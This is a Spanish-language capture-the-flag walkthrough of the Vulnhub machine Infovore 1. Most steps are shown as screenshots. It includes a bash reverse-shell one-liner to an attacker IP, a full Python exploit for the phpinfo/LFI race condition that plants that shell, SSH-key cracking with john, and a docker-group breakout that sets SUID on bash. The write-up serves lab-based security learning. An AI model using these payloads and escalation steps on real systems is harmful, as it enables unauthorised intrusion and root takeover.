#vulnhub #ctf-machine #medium-machine #linux  [Vulnhub Link](https://www.vulnhub.com/entry/infovore-1,496/)

## Enumeración inicial
Primeramente hacemos un escaneo ARP con `arp-scan` para identificar la IPv4 de nuestra máquina víctima:
![[Pasted image 20240821174914.png]]

Una vez identificada la IPv4, lanzamos una traza ICMP con `ping` para hacernos una idea de qué sistema operativo corre nuestra máquina víctima:
![[Pasted image 20240821175116.png]]

Mediante el TTL=64 podemos deducir de momento que se trata de una máquina Linux.

### Nmap
Hacemos un primer escaneo para detectar los puertos TCP abiertos de la máquina utilizando `nmap`:
![[Pasted image 20240821175410.png]]

Podemos ver que solo está abierto el puerto 80.  Por lo que hacemos un segundo escaneo con `nmap` para detectar la versión y servicio que corren bajo este puerto:
![[Pasted image 20240821175558.png]]

Podemos ver que se trata de un servicio "Apache httpd 2.4.28". Además podemos corroborar que se trata de un sistema operativo Linux Debian.

Por último escaneamos por con `nmap` utilizando el *script* "http-enum" para encontrar posibles directorios web:
![[Pasted image 20240821175802.png]]


## Enumeración web
Si analizamos con `whatweb` la web que corre por el puerto 80 encontramos la misma información que la web tiene un PHP 7.4.7:
![[Pasted image 20240821180146.png]]

Si abrimos la web en el navegador podemos ver lo siguiente:
![[Pasted image 20240821180415.png]]

Es una web bastante estática.

Si buscamos sobre como convertir un "php info" a RCE vemos esto:
![[Pasted image 20240821190202.png]]

Al parecer hay una forma de convertir un LFI a RCE mediante el "php info" si está activada la opción "file_uploads". Por lo tanto, miramos si está activada:
![[Pasted image 20240821190342.png]]

Por lo que si conseguimos un LFI podremos obtener RCE.

Si seguimos analizando la web vemos que el título pone "Include Me" por lo que se nos puede ocurrir hacer *fuzzing* con `wfuzz` de parámetros en la URL por si hay alguna forma de conseguir un LFI:
![[Pasted image 20240821190548.png]]

Como podemos ver hay forma de incluir archivos en la web mediante el parametro "filename"
![[Pasted image 20240821190632.png]]

Por lo que si subimos un archivo PHP malicioso mediante POST a `info.php` vemos que nos da una ruta del archivo:
![[Pasted image 20240821190818.png]]

Así que si utilizamos el *exploit* indicando nuestro LFI y `/info.php` podremos entablarnos una reverse shell si el código es capaz de acontecer la condición de carrera. El payload utilizado es un codigo PHP que ejecuta este comando:
```bash
bash -c 'bash -i >& /dev/tcp/192.168.1.21/443 0>&1'
```

> [!NOTE] El exploit utilizando se encuentra en: [[#Python exploit Race Condition]]

![[Pasted image 20240821195929.png]]
![[Pasted image 20240821195938.png]]

Por lo tanto, hacemos el tratamiento de la TTY:
![[Pasted image 20240821200225.png]]
![[Pasted image 20240821200256.png]]

Si miramos en el directorio `/var/www/html` podemos ver la primera *flag*:
![[Pasted image 20240821201008.png]]

## Escalada de privilegios
Si mostramos la IP podemos ver que se trata de un contenedor, ya que no estamos en la máquina víctima:
![[Pasted image 20240821201229.png]]

Por lo que hay que buscar la manera de salir del contenedor. Si hacemos reconocimiento durante un rato podremos encontrar un archivo algo extraño en el directorio raíz llamado ".oldkeys.tgz":
![[Pasted image 20240821214139.png]]

Por lo que tenemos capacidad de lectura así que podemos extraerlo para ver lo que contiene:
![[Pasted image 20240821214310.png]]

Son unas claves SSH, pero como podemos ver esta encriptada:
![[Pasted image 20240821214359.png]]

Pero podemos intentar *crackearla*. Primeramente utilizando `ssh2john` para convertirla en un *hash* para posteriormente *crackearla* con `john`:
![[Pasted image 20240821215213.png]]
![[Pasted image 20240821215316.png]]

Por lo que si intentamos migrar al usuario *root* con esta contraseña, podemos hacerlo:
![[Pasted image 20240821215436.png]]

Y si accedemos al directorio `/root` podemos ver la segunda *flag*:
![[Pasted image 20240821215600.png]]

Si miramos el archivo `/root/.ssh/id_rsa.pub` podemos ver lo siguiente:
![[Pasted image 20240821221636.png]]

Se trata de una "id_rsa" de la máquina víctima para el usuario admin por lo que si intentamos conectarnos a la máquina víctima por ssh conseguimos acceso:
![[Pasted image 20240821221810.png]]

Y podemos visualizar la tercera *flag*:
![[Pasted image 20240821221857.png]]

Si miramos los grupos del usuario admin vemos que pertenece al grupo docker:
![[Pasted image 20240821222144.png]]

Por lo que podemos crear un contenedor que contenga montado la raíz del sistema para ver archivos de los cuales no tenemos capacidad en un principio. Primeramente hacemos un pull de la imagen de ubuntu:
![[Pasted image 20240821223055.png]]

Después creamos un contenedor con la raíz del sistema montada en `/mnt`:
![[Pasted image 20240821223139.png]]

Nos conectamos al contenedor con una bash:
![[Pasted image 20240821223221.png]]

Y si accedemos al directorio `/mnt` del contenedor podemos ver todo el sistema:
![[Pasted image 20240821223303.png]]

Por tanto, podemos añadirle el permiso SUID a la bash:
![[Pasted image 20240821224436.png]]

Así que si salimos del contenedor y ejecutamos "bash -p" obtenemos una bash como root:
![[Pasted image 20240821224528.png]]

Y podemos ver la *flag* final que se encuentra en el directorio `/root`:
![[Pasted image 20240821224613.png]]


## Python exploit Race Condition
```python
#!/usr/bin/python 
import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php system("bash -c 'bash -i >& /dev/tcp/192.168.1.21/443 0>&1'"); ?>\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="cmd.php"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /index.php?filename=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&gt")
        fn = d[i+17:i+31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break                
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    print x
                    self.event.set()
                    
            except socket.error:
                return
    

def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)
    
    d = ""
    while True:
        i = s.recv(4096)
        d+=i        
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")
    
    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256

def main():
    
    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)
    
    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",  
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()
    
    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    main()
```

___
#local-file-inclusion #race-condition #abusing-capabilities #docker-breakout #web-enumeration 
#hash-cracking #abusing-special-user-groups 
___
